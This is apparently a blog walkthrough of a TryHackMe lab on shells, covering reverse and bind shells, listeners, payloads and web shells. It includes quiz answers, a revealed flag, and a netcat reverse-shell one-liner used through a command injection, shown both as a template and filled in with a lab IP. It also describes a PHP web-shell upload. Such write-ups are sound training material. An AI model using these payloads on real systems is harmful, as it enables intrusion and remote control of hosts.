This is a walkthrough of **Shells Overview** from **TryHackMe**

---

## üß© Task 2 ‚Äî Shell Overview

**Question 1:**  
What is the command-line interface that allows users to interact with an operating system?

> In the task, a shell is defined as ‚Äú- software that allows a user to interact with an OS. It can be a graphical interface, but it is usually a command-line interface‚Ä¶‚Äù  
> **Answer:** `Shell`

---

**Question 2:**  
What process involves using a compromised system as a launching pad to attack other machines in the network?

> In the task, one of the several malicious shell activities defined ‚ÄúAccess Other Systems on the Network‚Äù, stating that a goal can be to traverse the network to a different target from the initial exploited target in order to pivot to another compromised system.  
> **Answer:** `Pivoting`

---

**Question 3:**  
What is a common activity attackers perform after obtaining shell access to escalate their privileges?

> The answer would be in the question that it asks‚Äî  
> **Answer:** `Privilege Escalation`

---

## üîÅ Task 3 ‚Äî Reverse Shell

**Question 1:**  
What type of shell allows an attacker to execute commands remotely after the target connects back?

> As stated in the task a reverse shell or ‚Äúconnect back shell‚Äù ‚Äú- is one of the most popular techniques for gaining access to a system in cyberattacks. The connections initiate from the target system to the attacker‚Äôs machine, which can help avoid detection from network firewalls and other security appliances.‚Äù  
> **Answer:** `Reverse Shell`

---

**Question 2:**  
What tool is commonly used to set up a listener for a reverse shell?  
**Answer:** `netcat`

---

## üì° Task 4 ‚Äî Bind Shell

**Question 1:**  
What type of shell opens a specific port on the target for incoming connections from the attacker?

> In the task, a bind shell is known as a shell that binds a port on the compromised system. In order for the attacker to connect, the victim machine has to allow it due to firewall restrictions.  
> **Answer:** `Bind Shell`

---

**Question 2:**  
Listening below which port number requires root access or privileged permissions?

> Anything under this number requires netcat to be executed with elevated privileges. (Using port 8080 avoids).  
> **Answer:** `1024`

---

## üß† Task 5 ‚Äî Shell Listeners

**Question 1:**  
Which flexible networking tool allows you to create a socket connection between two data sources?

> In the task, Socat is explained as ‚Äúa utility that allows you to create a socket connection between two data sources, in this case, two different hosts.‚Äù  
> **Answer:** `Socat`

---

**Question 2:**  
Which command-line utility provides readline-style editing and command history for programs that lack it, enhancing the interaction with a shell listener?

> In the task, rlwrap is described as a utility that ‚Äúuses the GNU readline library to provide editing keyboard and history.‚Äù  
> **Answer:** `rlwrap`

---

**Question 3:**  
What is the improved version of Netcat distributed with the Nmap project that offers additional features like SSL support for listening to encrypted shells?  
**Answer:** `ncat`

---

## üíª Task 6 ‚Äî Shell Payloads

**Question 1:**  
Which Python module is commonly used for managing shell commands and establishing reverse shell connections in security assessments?

> Python has a payload that utilizes a subprocess module to ‚Äú-spawn a shell and set up a similar environment as the Python Reverse Shell by Exporting Environment Variables command.‚Äù  
> **Answer:** `Subprocess`

---

**Question 2:**  
What shell payload method in a common scripting language uses the exec, shell\_exec, system, passthru, and popen functions to execute commands remotely through a TCP connection?  
**Answer:** `PHP`

---

**Question 3:**  
Which scripting language can use a reverse shell by exporting environment variables and creating a socket connection?  
**Answer:** `Python`

---

## üåê Task 7 ‚Äî Web Shell

**Question 1:**  
What vulnerability type allows attackers to upload a malicious script by failing to restrict file types?

> What I don‚Äôt like in this question is the interchangeable terms revolving around ‚Äúshell‚Äù, ‚Äúscript‚Äù, and ‚Äúfile‚Äù. Try not to get tripped up with this.

## ‚öôÔ∏è Task 8 ‚Äî Practical Task

* `10.201.113.218:8080` hosts the landing page
    
* `10.201.113.218:8081` hosts the web application that is vulnerable to command injection
    
* `10.201.113.218:8082` hosts the web application that is vulnerable to an unrestricted file upload

### üß® Question 1

Using a reverse or bind shell, exploit the command injection vulnerability to get a shell. What is the content of the flag saved in the `/` directory?

I'll start with the URL of the target page.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1760683973640/fcc6f3be-0b87-416c-b70f-7dadfcde6740.png align="center")

The target page (port 8080) redirects us to a URL on port 8081 ‚Äî that's exactly when I noticed an opportunity to inject malicious commands through the input field.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1760683995236/5a079b80-3fd5-43ff-9454-b31b69ea51e8.png align="center")

First, I need to listen on the specified IP and port. Second, I need a payload that will provide a reverse shell.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1760684004254/56a97d7d-7b07-4e04-bd8d-36f26396d3fa.png align="center")

Set up a netcat listener on port 8081. Once netcat started accepting connections from the target machine, I needed a payload to get a reverse shell on the web server.

The task originally provided a payload template:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

I replaced ATTACKER\_IP/PORT with my details:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc 10.10.217.140 8081 >/tmp/f
```

**Then my AttackBox froze, so the data about my IP and the target IP changed.**

The site is currently stuck loading while I can browse the server for the flag.

Listing the root directory and outputting the flag file contents using ***cat***.

**Answer:** `THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}`

### üï∏Ô∏è Question 2

Using a web shell, exploit the unrestricted file upload vulnerability and get a shell. What is the content of the flag saved in the `/` directory?

Return to the landing page.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1760684056752/b7c01e18-c8a5-4547-9fee-08415bf7edc9.png align="center")

Our focus now is the ‚ÄúWeb Shell Task.‚Äù

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1760684064998/8cf20c90-7a65-4359-a87a-b8f9a4d3ee1c.png align="center")

This is similar to the input command-injection vulnerability, but here an unrestricted file upload is used to gain a reverse shell ‚Äî in other words, a web shell. I‚Äôll accomplish this by uploading a small web shell.

Creating that **.php** web shell is critical for what comes next. You can either find or create a simple PHP snippet that can browse and display files via the URL.

I need to create a **.php** file, insert the command, then upload it through the ‚ÄúUpload Your CV‚Äù field.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1760684073063/be70c8e9-8ba1-4501-9831-fcd04fd00dc9.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1760684081565/25536607-4562-4ac5-88dd-63ff9d97fa38.png align="center")

On the page, click **‚ÄúBrowse‚Ä¶‚Äù**, locate the file, then choose **‚ÄúOpen‚Äù** and upload the **.php** file.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1760684090499/cf1e7fc4-dbe4-4578-a08f-3425081d1038.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1760684100283/8647501a-25c3-4da0-8d63-55b731408fcc.png align="center")

Following the hint in the challenge, the area of relevance appears to be **/uploads**, not **/**.
